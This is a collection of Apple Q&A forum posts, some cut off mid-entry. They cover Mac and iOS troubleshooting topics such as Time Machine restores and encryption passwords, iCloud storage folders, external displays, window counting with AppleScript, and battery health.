I can still run the video in it, but when I select Finalize Project I receive an error message, apparently because I have deleted some of the video clips that comprise the project in the meantime. \nSimilarly, when I start the current project of iMovie, it load the project but then immediately warns me about missing files and is not able to play any video for that project at all.\nI guess the situation is that the older version of iMovie has stored a preliminary version of the video somewhere. Could I copy it in order not to loose this content upgrading to the current version of iMovie for good, i.e. removing the old version of iMovie? If so, where could that movie be found on disk?\nI would not expect to edit the legacy project any more, just retrieve the existing video.\n\nA: I've found a copy in ./Music/iTunes/iTunes\\ Media/Home\\ Videos\\my_project.m4v, although I cannot tell whether iMovie at some point placed it there.\n", "Q: Slow High Sierra after restore from Time Capsule So I had a hard drive (SSD) failure some time ago (it lasted 5 years of intense use, so I kinda expected that to happen).\nLuckily I had my Time Capsule running all the time, so it was a no brainer to buy a new SSD for my Macbook Air and restore it. \nHowever after restore I found out that my laptop wasn't quite as fast as it used to be, moreover I'd get frequent freezes & beach-balling that would last up to 20 seconds. Needless to say, I was quite concerned - I was running many system diagnostics, tried cleaning it up, did SMC & PRAM reset, but nothing seemed to help much.\nWhat was the issue?\n\nA: It turned out that my system restored in the old \"MacOS Extended\" file system. You can check yours by right-clicking your hard drive in Finder sidebar pane and choosing \"Get Info\". The correct entry for High Sierra should be APFS, like on the picture below:\n\nSo in case your restore left you with an older file system, you need to reinstall MacOS from the App Store. Unluckily I don't remember the exact details how I made the installer go through the installation again, but I managed to do this by finding the installer in Applications folder - without starting from the recovery partition (which would probably try to clean install my OS).\nI hope that helps someone!\n", "Q: SSD performance of different sizes MacBook or iMac, is there any speed difference between that 256GB, 512GB and 1TB options? And what about SSD endurance, does it differ in any way?\n\nA: Assuming that you're talking about SSDs within the same generations of Mac, then capacity has no bearing on the speed, quality and/or expected lifespan of the components being used.\nFor example, the 1TB, 2TB and 4TB options of SSDs in an iMac Pro are the same as each other in terms of quality and performance. Likewise for the various SSD options in current models of 15\" MacBook Pro and so on.\nWhere you will see differences are when you're comparing different drives, either because they're in different generations (or even types) of Mac models (e.g. 13\" MBP v 15\" MBP) or because they're a different type of storage device (e.g. traditional v fusion v solid state drives).\n", "Q: CloudDocs > session folder filled with version of a Pages file I'm on a 2016 MacBook Pro with macOS 10.13.5\nIn (User)Library/Application Support/CloudDocs there is a folder called session weighing approx. 35GB.\nInside there is another folder called r(why r?) which contains a few thousand files, 99% of which are what seem to be incremental versions of the same Pages document. \nWhy are those files there? \nCan I safely delete them? (for your knowledge, I have already copied the original final version of the file elsewhere for backup, just in case).\nWhat is the use of this folder (apart from being the iCloud Drive mirror on the computer's drive)? \n\nA: I don't know the answer to your question, but I have the same folder which is also huge. I'm pretty sure they are indeed incremental files.\nI have a few different ones, but there's not one for every Pages file I own, which makes me believe they are the files I wanted to \"revert\". There's an option in Pages, Preview, Keynote, Numbers and more Apple applications that lets you revert to a previous version. I think what happened is that it saved all previous versions.\nI just opened some of those files and tried to revert them, but they don't even revert back to all of those saves! Those gigabytes of files are there but I can't open them and I can't revert to them.\nI deleted all of the versions of one document and opened the actual one, the document was still complete.\nI did the same with another and the actual document is fine. I think you might be able to delete all of it. Maybe make a backup before you do so if it's an important file.\n\nA: I don't know what would happen if you delete them, but it doesn't look like it would free up a lot of space. If you select the folder in Finder and get info (cmd I, or File → Get Info), you'll see that it doesn't actually take up that space. In my case, the folder size is 4.15 GB, but it's only 30.7 MB on disk.\nThat is because on disk, only the differences between the files are saved. I know that the file system APFS has a feature to only store differences between files; but it could also be a macOS feature, just like Time Machine saves only differences between versions of files.\n", "Q: Time Capsule not accepting encryption password My setup here is several MBPs backing up to an Apple Time Capsule. Backups are encrypted. \n\n\n*\n\n*I boot to recovery mode on the MBP I want to restore to (Cmd+R).\n\n*Choose to restore from a Time Machine backup. \n\n*Choose the Time Capsule in the list, and enter its network password. Works fine. I can now see the backups. \n\n*Choose the particular MBP backup image I want to restore, and am prompted for its encryption password. \n\n*Enter this, but it doesn't work. Wrong password, apparently. Tried repeatedly. \n\n\nIf I boot the MBP normally I can see in Keychain Access that the password I'm typing is 100% correct. No doubt about it. \nI made sure to set the keyboard language correctly in recovery mode (it defaults to US English but I'm British). Still locked out. \nI can browse the backup just fine when macOS is booted. I doubt the backup is corrupted but, like I say, in recovery mode I'm not even getting far enough to find out. The password for the encrypted backup image just isn't being accepted. \nI've had this happen too in the past when I was utterly sure I had the right password, and I ended-up just abandoning the backup and starting with a fresh install. I can't do that here. \nAnybody got a clue as to how I can access this backup? Why do I have a feeling I'm encountering one of those serious bugs that Apple knows about but brushes under the carpet? \n\nA: I think I figured this out and it's extraordinary. The issue appears to be that Apple's encryption for Time Machine backups only accepts 12 characters. Yet there's no error message, so you can enter longer passwords than this and it will simply truncate what you type and then record it in the Keychain.\nSo if you set the password 1234567890123 (13 characters) for an encryption password when initially creating the Time Machine backup, it will actually use 123456789012 (12 characters) and not inform you at any point. And because it's now stored in the Keychain, you will never have to type it again except in an emergency so will never know — until it's pretty much too late. When you need to restore the backup, you type the 13 character password and Time Machine will not accept it!\nI think I'm correct here, but I might be wrong. I thought I'd share this just in case it's useful to anybody else.\nSo the solution:\n\n\n*\n\n*Ensure the keyboard is set to your nationality (UK or AUS English) by clicking the flag icon at the top right when in Recovery Mode. \n\n*Type only the first 12 characters of your Time Machine encryption password. Prob best to write it out and count the characters, and then type it in. \n\n\nLet me know if this solves your problem. \n\nA: An update for people in 2019. We had the same problem, luckily we could still access the keychain and check. In our case the password was truncated to 28 characters from the 32 we had written.\n\nA: Hopefully, my problem is the same, thus my experience may be additive to this.\nMac Mini 2018 fell over, reformated, reinstalled, couldn't get Time Machine to connect to the time capsule. Manually went through the setup process of macOS, creating my account, and such.\nOpened Finder, opened Network, opened the Time Capsule, password OK, opened Backup folder, opened the relevant sparse bundle, again password OK.\nPlease note: I am cutting and pasting the same password. No fat fingers here.\nIt mounts, I can happily copy files, user folders, from the encrypted time machine backup back to my system manually.\nSo good news. I restored it manually.\nNow I go to set up Time Machine again: System Preferences > Time Machine > select Back Up automatically > select Time Capsule > paste password > asks me if I want to use the existing encrypted > say Yes > asks for password > paste again > incorrect password!\nI tried truncating the password to 12 characters, no dice.\nI checked the Airport Utility: the backup folder says it is protected with the device password. This is consistent with my experience of manually mounting the sparse image with the same password. It is most definitely the password, I have 2TB worth of rescued files to prove it.\nWhat was weird is that through this process, I opened the sparse bundle many times in trying to isolate the problem, and well, sometimes the cut and pasted password would not work and I would have to force disconnect from the time capsule and start all over again.\nPerhaps future generations will figure this out.\n\nA: As of August 2022 and with Monterey 12.5.1, max password lengths for Time Machine appear to be up to 32 characters. I originally set up a longer password via a password manager, and entering just the first 32 chars worked to mount the drive.\n", "Q: Clean OS X install, keeping Time Machine history? I need to wipe and rebuild my Macbook Pro Retina's hard drive (OS X Yosemite, if it matters) and am planning on using Setup Assistant to restore all my data from my Time Machine backup. Question: once I do this, will my existing Time Machine history be preserved, so that I can, say, go and find a file's version as of two months ago? Or, is there a way of accessing my old Time Machine data through the Time Machine interface (so I don't have to burrow through all the hidden Time Machine files)?\n(This question was previously asked as \"Clean Lion install, keeping Time Machine history?\", but the fundamental question of Time Machine History was never answered.)\n\nA: Well, I tried it, and indeed the Time Machine history is preserved (at least with OS X Yosemite). I did the following:\n\n\n*\n\n*Erased the hard drive\n\n*Installed Yosemite\n\n*Restored from my Time Machine backup drive\n\n\nAfter all this was done, and with the backup drive connected, I entered Time Machine on my Documents folder, and there was the history.\nGood work, Apple!\nEdit: I finally had to buy a new MacBook Pro, and used Setup Assistant again to transfer all my files from my old MacBook's Time Machine archive. It worked well, and when I was done I booted from my new MacBook everything was there.\nInterestingly, when I re-enabled Time Machine on my new MacBook, still attached to my old MacBook's Time Machine disk, I got the following dialog (actually with different disk names):\n\nSure enough, after I chose \"Inherit Backup History\" my new Mac was using the old Time Machine backup disk, history in all.

I have VGA cable and HDMI/VGA adapter and everything seems to connect fine, but the monitor doesn't see any input. The Mac mini works attached to TV using HDMI, but the TV also doesn't see VGA input if I try VGA (and HDMI/VGA adapter).\nIf this won't work, what will?\nADDITIONS: On further investigation it seems that I may need to use thunderbolt port to connect to VGA. I am having trouble finding thunderbolt to VGA adapter and would like to confirm that mini DisplayPort to VGA adapter is compatible.\nAlso, thanks to user3439894 for edits/improvements.\n\nA: Does the adapter work with other devices? If not, then your adapter is likely broken. You should be able to attach an HDMI to VGA adapter to your Mac. Video adapters aren't computer/software specific. Side note, it would be a better idea to convert HDMI to DVI instead of VGA since HDMI and DVI are both digital, meaning they will output higher quality video, whereas VGA is analog, and will output lower quality video.\n", "Q: How to change Google Chrome's address-bar-text font size (the 'https://...')?

But at times, the latter shortcut may not effect a switch when the target app has only single window open.\nIs it feasible to determine the total count of open windows for the target app? (E.g. by having the count of open windows shown under the app icon in app switcher UI or in the Dock)\n\nA: No - there's not a general solution for this. You might need to add a follow on question explaining why you need this information and what you'll want to do once you have that information. Some apps are well behaved and you can use automation to request a count of active windows or use Mission Control or script things in python with an objective C bridge to count all windows based on your definition of “open” whether it excludes hidden / minimized / on another virtual space or screen or just the windows visible.\n\nKeep in mind if you’re scripting things, with App Nap / Sudden Termination / Power Nap and all the advanced power scheduling technology that's been added to macOS - you can't really even define if some apps are even running. You will have an app running and show up in the dock and app switcher when each and every thread of that app is killed and nothing is running on the kernel. Similarly - you can have threads running on the kernel - doing active work when the app is technically not running and you won't see it in the dock or the app switcher.\nQuite simply, the OS and applications deeply integrate to start and stop things and the illusion that an app is running is no longer something you want to manage. You should expect that when you switch to an app or launch an app, that it responds quickly and lets you get back to work regardless of the status of it running or not before you asked it to do work.\n\nA: While as mentioned in the question, it is not natively possible to show the count of open windows for an app in either the app switcher UI or the Dock, there are a couple easy methods (that I personally employ) to determine if an app has one or more window(s) open and easily switch to the the desired one. Setup and usage for both of them is described below.\nNote: These approaches are applicable only for the apps that show a window and is not applicable for the apps which run in background and Menu Bar apps.\n\nMethod I : Using Mission Control\nMission Control gives you a birds eye view of all the running apps with open window in the system. To invoke Mission Control, press the Mission Control (F3) key on the keyboard.\n\nYou'll need to check Group windows by application under System Preferences app → Mission Control to see windows grouped by application to easily serve your requirement by knowing at a glance if the target app has one or more windows open.\n\nMission control display both without window grouping by application and with is shown below for easy reference (Notice that the same set of apps and windows are currently open in both the cases). The former approach has the benefit that the app group also shows the app icon towards bottom centre of the group which helps in easy identification.\nWithout grouping:\n\nWith grouping:\n\nAdditionally, you may have more than one Spaces active at the same time and the app windows may be scattered across different Spaces. Only the windows present on the current Space are shown at a time and you can easily switch between Spaces without leaving Mission Control view.\nYou now have an idea if the target app has one or more windows open. While in Mission Control view, you can simply click on the window group for the target app to switch to it (instead of doing Cmd + Tab). Once the target app is frontmost, you can perform Cmd + ` to switch to desired window of the app (if it has more than one window open).\nThis approach has a drawback that an app may additionally have one or more minimised windows and the Mission Control view doesn't show them, thereby defeating the purpose. That's where the second approach as discussed below helps.\n\nMethod II : Using Hot Corners\nYou'll need to configure Hot Corners for this approach.\nHot Corners is a feature of macOS that lets you assign instant actions for when you move the mouse pointer to any one of the four corners of your Desktop.\nFor more information on Hot Corners, read the discussion What are Hot corners in macOS?.\nConfigure any one of the four corners via Hot Corners configuration to show Application Windows.\n\nNow switch to the target app using either Cmd + Tab or Mission Control (as discussed in Method I). Once the target app is frontmost, use Hot Corners by moving the mouse pointer to the configured corner. All the open windows for the app are shown.\n\nThe benefit of this approach is that it also shows the minimised window(s) (which are shown towards the bottom in smaller size). To switch to the one desired window among many open, simply click on it with your mouse pointer. If the desired window is minimised, it will be automatically maximised and brought to front.\n\nI employ both the above discussed approaches as one of the powerful workflows in my day to day usage of macOS. (The screenshots may be a bit unintuitive, as I have set the Menu Bar to Auto Hide, have High Contrast display enabled and transparency effects turned-off in macOS).\n\nA: You could write an applescript for this purpose:\ntell application \"System Events\"\n    repeat with _app in (every process whose visible is true)\n        tell _app\n            log (name as string) & \": \" & (count of every window)\n        end tell\n    end repeat\nend tell\n\n", "Q: AppleScript / Automator to sort files based on filename I want to select a folder of QuickTime movies and copy each one into separate sub folders depending on the filename (by copying not moving).\nI have a folder that I want to contain sub folders called XA and XB, but I only want them to copy across the h264 versions.\nExample file names are as follows:\nXA0000_v001_h264.mov\nXA0000_v001.mov\nXB0010_v002_h264.mov\nXB0010_v002.mov\n\nWhat would be an efficient way of coding this?\n\nA: Apologies in advance if you only wanted a script. I would have commented, but I'm 5 rep short. This isn't an applescript/automator, but it still might help.\nYou can use Find any file. Website description: \n\nFind Any File is a program for Apple's Mac OS X that lets you search\n  for files on your disks.\n  \n  \n*\n  \n*Contrary to Spotlight, it does not use a database but instead uses    the file system driver's fast search operations, where available. This lets you search for file properties such as name, dates, size, etc., but not for file content (that's what Spotlight is best at!) — unless you want to find plain text only). \n  \n*Find Any File can find files that Spotlight doesn't, e.g. those inside bundles and packages and in inside folders that are usually\n  excluded from Spotlight search. \n  \n*Finally, it is quite fast. A search only takes a few seconds    on an internal hard disk or SSD. Try for yourself!\n  \n\nBasically, it's like \"Everything\" for mac. But what you could do is search for any file that ends with \"_h264.mov\" within the folder (whatever folder you feel like. If you want to automate, I suppose you could do a GUI script of find any file, but you might find another solution. \nExample image: \n\nA: This is an AppleScript you can use. You can save it as an application, then drop the folder containing your file, or run the script and select that folder when prompted. It copies the files with \"h264\" in their names to Sub Folder XA, and moves the files without \"h264\" in their names to Sub Folder XB.

The photo quality is my iPhone 7 is very low. I found out that this may be because I switched on “iCloud Photo Library” a few months earlier, and “Optimize IPhone Store” was selected. Does doing so move all PREVIOUS photos to cloud, and replace them with low-res photos?\n\nA: The answer is in the Optimize iPhone Storage setting.\nWhen enabled, only thumbnails of photos are stored in local storage. By viewing a photo, you are downloading a compressed version from iCloud. There is no quality loss, since the original photos are still accessible by loading them one by one or turning this optimization off.\nI believe that iCloud Photo Library uses some kind of lossy compression.\n\nA: Here's a fix that worked for me.\nKeep in mind: Although the screenshots are in Danish, the instructions below are in English, and the placement of the marked settings are the same in both English and Danish running iOS 12.2. \n\n\n*\n\n*Go to \"Settings\" in your iPhone. Scroll down until you find \"Photos\". Tap it (Marked with a red circle in the following picture)\n\n\n*Now, you should see the following screen. Tap on \"Download and Keep Originals\" (Marked with a red circle in the following picture)\n\n\n*Scroll down until you find a setting called \"Keep Originals\". Tap it. (Marked with a red circle in the following picture)\n\n\n*Go back to \"Settings\" by tapping on the arrow in the upper left corner. (Marked with a green circle in the following picture)\n\n\n*Now you should see the following screen. Right under the \"Photos\" setting, you'll find a setting called \"Camera\". Tap it. (Marked with a red circle in the following picture)\n\n\n*Now you should see the following screen. Tap on \"Formats\" (Marked with a red circle in the following picture)\n\n\n*Now you should see the following screen. Tap on \"Most Compatible\" (Marked with a red circle in picture 6)\n\nThis should fix the issue :-) \n\nA: I’ve seen no degradataion whatsoever by optimize and yes, the compression used is lossy, but I believe Apple keeps the actual screen resolution / print resolution in mind and does very light handed compression (as opposed to severe compression at high ratios that causes bad image quality.)\nWhat do you see for the size of an exported image? You should be able to save off the images to Files / iCloud and then download them from the computer if you don’t use an iOS tool like ViewEXIF to see the resolution (pixels) and size (KB/MB) of the images.\nFor me, when I need to do an operation like edit the photo and I have a reduced resolution size image (if it were added recently and I only have a placeholder), iOS shows me that it’s downloading the full resolution image from the cloud so I can then share / export a good quality image. \n", "Q: sudo disable trimforce doesn't work Since upgrading to High Sierra my boot time slowed down considerably (from ~10 seconds to 90 seconds). Googling this problem suggests disabling Trim might work as a solution, which you do via the sudo trimforce disable command, but it doesn't actually seem to disable Trim.\nAfter running sudo trimforce disable and pressing y twice, my Mac automatically reboots but after rebooting, system_profiler SPSerialATADataType | grep 'TRIM' or System Information->SATA/SATA Express still shows TRIM Support: Yes\nI also tried to disable System Integrity Protection before disabling Trim, and that doesn't seem to work either.\nAnyone got any ideas?\n\nA: Other users have also reported the same issue. TRIM may not actually be disabled on macOS even if forced. In my testing on a 3rd-party SSD, I could never disable TRIM on High Sierra.\nOn another note, it might be possible to improve your boot performance by following a guide I posted back when I was having similar issues.\nThe gist of it is that re-blessing the boot partition, and resetting SMC+NVRAM may improve boot performance. To re-bless, simply go to System Preferences > Startup Disk, select the desired boot partition, and restart from there.\n", "Q: My Mac doesn’t help an admin user?! Help!

This changed my unencrypted file system to encrypted APFS. \nDoes Apple provide any information about how APFS encryption works? Does the account password protect the private key? Then how can there be a guest user? When my account password was weak, does changing it improve encryption security?\nWhat is the encryption method and strength?\nI'm used to Windows BitLocker, where the encrypted partition is either locked or unlocked, and the Windows account password is different from the BitLocker passwort protecting the private key. The encryption method and strength can be set via Windows group policies.\n\nA: APFS encryption is done with the AES encryption algorithm in XTS mode with a 128 bit keylength. This is the same algorithm, mode and keylength used by earlier versions of macOS too (i.e. with HFS+ file systems). \nAs you mention Windows BitLocker, this is actually the same method and strength that Windows has recently started using in the newer versions of Windows 10.\nRegarding your other questions about guest users and account passwords - this really has nothing to do with APFS encryption. This is instead handled by a layer above called File Vault 2.\nFile Vault 2 with APFS is really the same as with HFS+ with the one difference that APFS has built-in encryption support (i.e. the AES-XTS-128 for encrypting the data) where HFS+ needs encryption added as layer on top of the file systems (i.e. via Core Storage). In practice there's no real difference for most end-users.\nIn any case, all the key handling that makes full disk encryption work for the end-user to handle such things as booting from an encrypted drive, user accounts, guests, recovery keys, etc. are all handled by File Vault 2 - which is seperate from the file system itself.\n", "Q: Lost iPhone- how Find my Phone works? My son thinks he lost his iPhone whilst out cycling yesterday-he had no data til he got new months allowance which started today- this morning on find my phone it showed at house but we can’t find anywhere- does it show last place it was in when it had WiFi or is it still here now?- have ripped House apart! Thx\n\nA: If your iPhone status is green (online), it's still connected to your home WIFI. If the status is gray, it's showing you the last visible location. You can even see the time and date of that last location.\nIf your data plan renews today, it should setup automatically. That said, if the phone was lost whilst cycling and is still up and running, you could see the actual location (based on cellular data).\nBased on this, I presume you can find it at home: Open Find My iPhone again, there is a button to make it ring.\n", "Q: Error message \"The location of the document “Social Stats record Spreadsheet.numbers” cannot be determined\"?

So I stopped it and tried to bring the files back in to Backups.backupdb, but it won't let me.\nSo I've got all these files I can't trash, but can't put back.\nAny ideas?\n\nA: So, as an answer, save any other data on another drive, then reformat and partition the drive.\nYou shouldn't be able to put any Time Machine files into the trash in the first place, so if that happened, you need to get anything you care about off that drive and erase it anyhow. If you don't need the backups - you can use Disk Utility to just erase the drive - that will empty your trash instantly as well as all the data on that drive.\n\nA: I had the same problem. Tried to trash old Sierra backups and certain files got stuck in the trash. However, when I tried erasing and then re-partitioning the backup drive, I lost the OS for my working drive!\nWhile Disk Utility was erasing my backup drive, the erased drive disappeared and then the working drive disappeared... and access to my computer started to go out, app by app... I powered off (power-button) in case Disk Utility was trying to erase more... After powering up in Recovery, Recovery would not work, so I went into an older drive that still had Lion on it... and got into my computer that way. I accessed Disk Utility and RENAMED the backup drive, and clicked Repair on my working drive, and when it told me the drive was still ok, I then powered off and went into Recovery to try and re-install a copy of Sierra to my working drive, but my working drive BOOTED UP NORMALLY. The renaming of the backup drive solved the problem and everything is as it was.

However, many iPad apps have an option to upload via \"iCloud Photo Sharing\" that seems to have nothing to do with the Photo Library in iCloud despite sharing with same logo.\nFor example, I created a so-called shared album with \"iCloud Photo Sharing\" on iPad and my iCloud does not show any change; similarly when I created a different album in Photo Library on iCloud, the \"iCloud Photo Sharing\" on my iPad cannot see it.\nI was using the Vectornator app and could not save work (svg) to iCloud. This should be very simple but unfortunately is very confusing for a first time iPad user. How do I work with photos/images basic cloud-uploading not from camera but from app?\n\nA: iCloud Photo Sharing is a different service than iCloud Photo Library. iCloud Photo Sharing allows you to share an album with another iCloud user (friends, relatives...) while iCloud Photo Library is just a cloud-based storage provided by Apple.\nBasically iCloud Photo Library allows you to store and organize images (either from camera roll or from apps)into  albums and folders so you can access them on all your devices connected to iCloud an even from the web at icloud.com. albums and folders you created can be found at the \"albums\" tab of the iPad photo app.\nOn the other side iCloud Photo Sharing allows you to create a shared album that you can share via a link or directly to an iCloud user. This album is displayed in the \"Shared\" tab of your iPad photo app. removing this album won't delete the photos it contains from your photo library.\nConcerning Vectornator app you have two options to save your work on iCloud:\n\n\n*\n\n*Save the artwork to your iCloud Photo Library (export to PNG or JPEG)\n\n*Save the artwork as a file on iCloud Drive (export as PDF or SVG)\n\n\nNote that iCloud Photo Library purpose is to save and organize photos, not professional work or other artwork so you must not (and cannot) save SVG files to iCloud Photo Library.\n", "Q: Applications on macbook pro close waking computer up after 1 hour lunch It's lunch time at work and I put my macbook in screen saver mode by using a hot corner.

A dude is selling the following chips, but I don't know what CL3, CL2.5, SDRAM, SDCL3, 168P and DIMM means. Could someone please explain what these terms mean, and most importantly: Which ones will work on the Mac?\n1 x Kingston   512MB 133MHz CL3\n1 x RAMOS TEK  512MB 133MHz CL2.5\n1 x Samsung    512MB PC133 SDRAM\n1 x TwinMOS    512MB PC133 CL3\n1 x Winbond    512MB PC133 SDCL3\n3 x Transcend  512MB PC133 SDRAM 168P DIMM\n\n\nA: You never mentioned which eMac you specifically had, but according to EveryMac.com, there are only two possibilities:\n\n\n*\n\n*PC 133 SDRAM.  Compatible with 2002 through 2003 models.  \n\n*PC-2700 SDRAM.  Compatible with 2004 through 2005 models.\n\n\nBoth machines require 184pin modules\nCL numbers have to do with the latency of the memory (CAS Latency) or in other words, how many clock cycles before it transfers data.  Lower numbers are faster.\nSDCL3 just looks like a manufacturer \"smashing\" together of SDRAM and CL3.  \nDIMM is \"dual in-line memory module.\"  Basically, there's memory paths on both sides of the module (as opposed to SIMMs).  \nFor more info, see this article on RAM types.\nAs for which memory will work in your eMac, it's impossible to say for sure because they're all (with the exception of the Transcend memory at 168 pins) missing the pin count.

I have one monitor connected to the dock through HDMI at 1920x1080, and a second monitor connected to the VGA port. However, the monitor connected through the VGA port does not display anything unless the HDMI connected monitor is disconnected.\nIs it possible to get both displays showing simultaneously through this dock and these connections, preferably with extended display mode? As far as I can tell from the WD15 manual, 2 monitors should be supported at this resolution.\n\nA: No, that is not possible with that dock.\nThe WD15 manual does not state that this is a supported configuration. It is only supported for Windows, not macOS.\nIn order to do what you want, you'll need a Thunderbolt 3 dock instead of a USB-C dock. This is due to the way the signal needs to be demultiplexed in order to drive two separate displays. Essentially this particular dock uses MST (multi-stream transport) in order to drive separate displays - the MacBook Pro does not support that.\n", "Q: MacBook Pro 13\" 2015 A1502 recording vinyls through headphone jack My 2013 MacBook Pro allowed me to convert audio from old cassette tapes and vinyl to digital by using a 3.5mm Male To Male Stereo Audio Cable from the player's headphone jack into the headphone jack of the MacBook Pro 2013.  In the System Preferences, you could change the headphone jack to function as input rather than output.  Easy. You could use Quicktime to record and other apps.\nI found some old vinyl albums that I want to convert to digital but my 2015 MacBook Pro does not seem to be able to do what I mentioned above.  Playing the music  over the air and recording using the internal microphone would not be acceptable.  \nSuggestions to accomplish this?\n\nA: Record players typically needed a RIAA amplifier in order to get the same electrical signal levels as most other devices like tape recorders or CD players.  These were typically built into the amplifiers.\nToday you need this separately.  I have had good experience with a Behringer UFO202 which plugs directly into a USB port and is immediately recognized by MacOs as a sound input and output device.\nNote that this is a budget device at around $30.  If sound quality is very important to you, you need a more expensive device.\nThere is a review here: https://www.whathifi.com/behringer/u-phono-ufo202/review\n", "Q: How can I prevent jittery video playback on High Sierra? I have a 17-inch MacBook Pro with 2.53 GHz Intel Core i5 8 GB 1067 MHz DDR3. I purchased some kids videos from iTunes in 2015/2016 to entertain my kid. Those videos played flawlessly then. \nToday, in 2018, I was trying to play exactly the same videos again on the same computer but with latest macOS High Sierra. The videos playback becomes jittery. The sound is still smooth, but the video is like several frames per second, not watchable at all. I've heard Apple deliberately slowed down the iPhones. I'm wondering whether they did the same thing with MacBook Pro.\nUpdate:\nI installed El Capitan, and played the same video. It was smooth as it should be. Here are the evidence:\nhttps://www.youtube.com/watch?v=fogEmqSE0ME\nhttps://www.youtube.com/watch?v=iBljv5YnjnY\n\nA: No, Apple did not deliberately slow down your Mac. (As for deliberately slowing down iPhones see this).\nThe reality is I see this sort of thing all the time, on both Macs and PCs, as well as other devices (e.g. smartphones, tablets, etc).\nAs time goes by the minimum requirements for software and hardware change, and the configuration of a particular system will have a big impact on how long it will continue to keep up with software changes etc.\nWithout knowing the full specs of your MacBook Pro (e.g. type of storage device, software, etc), it's nevertheless 8 years of age and obsolete.\nAs a result, this model will run Mac OS X El Capitan better than it's going to run macOS High Sierra. And, once you're running a particular version of an operating system, this will have much broader ramifications. It's not just the OS, but bundled software such as browsers that have greater requirements. Additionally, some 3rd party software/hardware will no longer work, or they'll have limitations, hence the need to regularly update/replace them as well. \nIn general, macOS High Sierra has greater requirements than El Capitan had, and although it still runs on older hardware such as yours, that doesn't mean all features will work on your machine. And while High Sierra can run with 2GB of physical RAM, its requirements are such that it's more RAM hungry than El Capitan was, hence placing a greater burden on your storage device for virtual memory purposes (having a fast SSD is going to handle this better than a traditional hard drive).\nIn other words, the problem you're experiencing is most likely the result of a scenario something like the following:\n\n\n*\n\n*macOS High Sierra needs more memory to run (both in terms of RAM and graphics)\n\n*It therefore uses more of your physical 8GB RAM, thereby leaving less RAM available for other software etc\n\n*In response, macOS High Sierra makes more use of virtual memory to help manage the limited memory resources\n\n*This places a much greater burden on your storage drive which is having to deal with a lot more read/write operations\n\n*Your video playing software is potentially having to make more use of virtual memory and your storage drive is having to perform even more read/write operations as it has to deliver the video as well as everything else it's doing\n\n*End result: A stuttered playback experience.\n\n\nSummary \nThe overall burden on your system from having High Sierra installed (along with all of its associated software etc) is much greater than having El Capitan installed. And, this overall burden will be more obvious with some functions than it will be with others. Unfortunately, playing video files is one such candidate for this. \nIf you had a 2011 MBP you might have been able to address this by increasing your RAM to 16GB, but that's not an option here. If you don't have an SSD already, then installing one will definitely help. If playing videos is the main purpose of this machine, then leaving it with El Capitan installed may be an option for you. Otherwise it's time to reconsider your setup as your MBP is no longer able to meet all of your needs.\n\nA: This problem is now solved when iTunes is upgrade to 12.8.2 in High Sierra.\n", "Q: Scheduled startup/wake while on battery power I would like to automatically turn my Macbook Pro on at a certain time in the future (preferably with Terminal).

And I do not want to use caffeinate because it would drain the battery significantly more)\n\nA: No, you can not schedule your Mac to power on when it is battery powered.\nDesign Choice & Deliberate Limitation\nA scheduled power on event requires the Mac be connected to mains power. This is a deliberate limitation enforced by Apple's engineers. This is to protect your Mac from powering on while in confined or poorly ventilated spaces such as in luggage. In these situations your Mac risks overheating and being damaged.\nBeing able to power on while on battery is a common feature request to my Power Manager software.

This was great as it allowed me to have full control over my music. that is, play music; find a YouTube video, pause music, start YouTube video. That YouTube video would then end then I would be able to play my music again.\nNow since High Sierra, that doesn't happen. If I have a YouTube video up, it controls that instead of my music. This means that I have to open up iTunes, then click the play button and go back to Safari. I fixed this by using BetterTouchTool to reprogram the function buttons to bring back the pre High Sierra functionality.\nToday, with the TouchBar, I am back with the same issue. Yes, I can use BetterTouchTool but now that requires two clicks. One to activate the BTT controller strips and another to press the play/pause button.\nIs it posible to have a global button in the TouchBar controls strip that controls iTunes only?\n\nA: I am 5 reputation short of being able to make this a comment, but I think it's enough of a solution that I can post it as an answer.\nI do not have better touch tool or a menu bar (I do have keyboard maestro and I know you could probably do it using that).\nHowever, what you can do is either script the menu item or send a keystroke to iTunes using applescript.

I need to install macOS high sierra but i need to know the data will be erased or not and what is the way to install it without lose data.\n\nA: Generally speaking, your can \"upgrade in place\" meaning High Sierra will install, upgrading your old version of macOS while keeping your data intact.\nHowever, you should back up your data.  This is the very first thing Apple says to do after checking that the upgrade is compatible with your machine.\n\n\nBefore you upgrade, we recommend that you back up your Mac. Then, if\n  your Mac is running OS X Mountain Lion 10.8 or later, you can upgrade\n  directly to macOS High Sierra.\n\nUpgrades should go without issue, but things happen.  For example, the upgrade could be interrupted for any reason beyond your control thus, compromising your data.\nAdditionally, High Sierra will convert your HFS+ file system to APFS on the fly meaning you're converting file system that \"holds\" your data.  This introduces another level of complexity increasing the chance for failure.\n", "Q: iPad Pro 10.5\" down to 92% battery health after 6 months of use (update: 84% after 1.5 years) I bought an iPad in January 2018 (this was written in July 2018). The coconutBattery app indicates it was manufactured in August 2017. It has gone through 63 charging cycles and the battery health is already down to about 92%.\nMeanwhile, my iPhone X, which was manufactured in October 2017 and which I started using in November 2017 is still at 100% battery health (in truth, a few mAh above design capacity), despite 138 charging cycles.\nSuch rapid degradation seems out of character. None of my previous iPads (or iPhones, or MacBook Pros, ...) showed anything like this so quickly. If it continues like this, the battery will barely last for 2 years until it reaches the 80% health indicative of end of life.\nI'm wondering if Apple usually replaces batteries (or the whole unit) in such a situation. Also, is there an \"official\" (Apple-blessed) way of obtaining the device's battery health? I don't think they will consider info obtained with coconutBattery as valid. I know about the beta Battery Health feature in the Settings app, as it's available on my iPhone, but apparently not for iPads.\nUPDATE Jul 22 2019: the battery is now at 178 cycles at only 80.7% health. Technically it’s a few percent over the 80% limit, but when it drops below 80% I’m calling Apple to see if they’ll offer me a free replacement, seeing as a battery with less than 2 years of usage and less than 200 cycles shouldn’t be nearing its end of life.\nBy the way, sometime near the end of last year, or the start of this year, I started to care for my devices’ batteries in a way that most would describe as OCD-like, after doing some deep research in scientific journals for the main factors that prolong battery lifetime. I’ve rigged a USB connector, sitting between an Apple original iPad charger and an Apple original Lightning cable, with the proper pull-up resistors to charge at 500 mA (seeing as low C-rates are better for the battery). About 90% of the time my iPad is charged exclusively through this, and for most of the rest of the time, at 1 A. Only very rarely do I charge it using a 10 W or 12 W charger, and I may have tested it a few times with USB-PD using an original MacBook Pro USB-C charger and an Apple original USB-C to Lightning cable.\nMost importantly, I’ve been manually stopping the charge at 60 to 70% most of the time as well (I have let it slip to the 80% to 90% range a few times, and even more rarely, to 100%). This is universally accepted advice to prolong the lifetime of lithium-ion batteries. Like I said, one would be hard pressed to find a person that charged this 